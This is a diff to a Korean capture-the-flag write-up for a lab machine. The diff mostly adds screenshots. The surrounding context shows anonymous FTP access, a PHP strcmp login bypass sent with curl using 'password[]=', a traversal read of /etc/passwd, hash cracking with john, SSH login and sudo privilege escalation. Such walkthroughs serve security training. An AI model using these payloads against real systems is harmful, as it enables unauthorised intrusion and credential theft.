@@ -79,6 +79,7 @@ ftp 172.16.11.221 2112
 
 <img width="1142" height="622" alt="Image" src="https://github.com/user-attachments/assets/75890bba-872c-4ff7-a271-5a1f1cc89377" />
 
+> ProFTPD는 설정에 따라 anonymous 로그인을 허용하는 경우가 있다. 패스워드 없이 접속을 시도했더니 성공했다.
 
 ```
 Name: anonymous
@@ -93,6 +94,8 @@ ftp> bye
 ```bash
 cat index.php.bak
 ```
+
+<img width="1139" height="673" alt="Image" src="https://github.com/user-attachments/assets/5927f230-db1e-4506-ad56-215f79806572" />
 
 > 소스코드에서 로그인 로직 발견:
 
@@ -109,6 +112,8 @@ if (strcmp($_POST['username'], "admin") == 0
 > → 비밀번호는 `potato`에서 변경된 상태 → 직접 로그인 불가  
 > → `http://172.16.11.221/admin/index.php?login=1` 접속 시도
 
+<img width="1139" height="364" alt="Image" src="https://github.com/user-attachments/assets/3c18e0fa-9ea9-4512-a3e2-940916dd46b4" />
+
 ---
 
 ## 🔎 6단계: /admin 하위 경로 추가 열거
@@ -119,6 +124,10 @@ gobuster dir -u http://172.16.11.221/admin \
   -x .php,.txt
 ```
 
+<img width="1138" height="474" alt="Image" src="https://github.com/user-attachments/assets/6493b22f-541e-4661-93d9-95f25f7b8a03" />
+
+<img width="1132" height="348" alt="Image" src="https://github.com/user-attachments/assets/b9933a6e-1a17-47f1-b973-247d6d65f332" />
+
 > 발견:
 > - `/admin/index.php` (200)
 > - `/admin/logs` (301) → **패스워드 변경 이력 로그 존재**
@@ -126,6 +135,8 @@ gobuster dir -u http://172.16.11.221/admin \
 
 > `/admin/logs` 확인 결과, 비밀번호가 변경된 이력 확인  
 > → 현재 비밀번호를 알 수 없으므로 **로그인 우회 방법** 필요
+
+<img width="1119" height="270" alt="Image" src="https://github.com/user-attachments/assets/0c3253b4-4d86-479c-916e-881d3735b4de" />
 
 ---
 
@@ -145,6 +156,12 @@ curl -X POST "http://172.16.11.221/admin/index.php?login=1" \
   -d "username=admin&password[]=" \
   -v
 ```
+
+<img width="1140" height="656" alt="Image" src="https://github.com/user-attachments/assets/e69eb5b5-2dbf-4cee-8f25-3d875c62aca7" />
+
+<img width="1150" height="309" alt="Image" src="https://github.com/user-attachments/assets/61ca8403-90b2-477d-90c2-830b1211b2ea" />
+
+<img width="1083" height="807" alt="Image" src="https://github.com/user-attachments/assets/8ee7df52-f851-4710-9144-2b4df358bdd4" />
 
 > 응답 헤더에서 쿠키 획득:
 > ```
@@ -175,6 +192,9 @@ curl "http://172.16.11.221/admin/dashboard.php?page=log" \
 > webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
 > ```
 
+
+<img width="1080" height="581" alt="Image" src="https://github.com/user-attachments/assets/40f46813-ce1a-4245-bb0d-dd5fb88c76cb" />
+
 ---
 
 ## 🔓 9단계: 해시 크랙 & SSH 접속 → user.txt 획득
@@ -186,6 +206,9 @@ echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > pass.txt
 john pass.txt
 ```
 
+<img width="1109" height="148" alt="Image" src="https://github.com/user-attachments/assets/d5b8134d-83ac-48db-867a-1dd1d0f1f3c3" />
+
+
 > 크랙 결과: 비밀번호 = **`dragon`**
 
 ```bash
@@ -193,11 +216,16 @@ ssh webadmin@172.16.11.221
 # password: dragon
 ```
 
+<img width="1116" height="315" alt="Image" src="https://github.com/user-attachments/assets/ab642a58-0d3a-4782-af15-301c2607b355" />
+
+
 ```bash
 cat user.txt
 ```
 
 > 🎉 **user.txt 플래그 획득!**
+
+<img width="1085" height="315" alt="Image" src="https://github.com/user-attachments/assets/41012dd6-ff71-4e38-a999-f3b7e8b555b0" />
 
 ---
 
@@ -206,6 +234,9 @@ cat user.txt
 ```bash
 sudo -l
 ```
+
+
+<img width="1085" height="354" alt="Image" src="https://github.com/user-attachments/assets/3292fa7b-ced5-42c0-9d93-6cec0804ff81" />
 
 > 결과:
 > ```
@@ -229,9 +260,14 @@ whoami
 # root
 ```
 
+
+<img width="1087" height="203" alt="Image" src="https://github.com/user-attachments/assets/e45d8d18-5b0a-4dfc-97aa-f834e66aa081" />
+
 ```bash
 cat /root/root.txt
 ```
+
+<img width="1082" height="72" alt="Image" src="https://github.com/user-attachments/assets/94121d14-56fb-4777-a690-c23da888f68e" />
 
 ```bash
 echo "bGljb3JuZSB1bmlxYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==" | base64 -d
@@ -239,7 +275,11 @@ echo "bGljb3JuZSB1bmlxYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLW
 
 > 🏁 **루트 플래그 획득 완료!**
 
+<img width="1075" height="106" alt="Image" src="https://github.com/user-attachments/assets/d9e31f21-cde8-4777-93bb-3ed214c99b8a" />
+
 ---
+
+
 
 ## 🗺️ 공격 흐름 요약
 
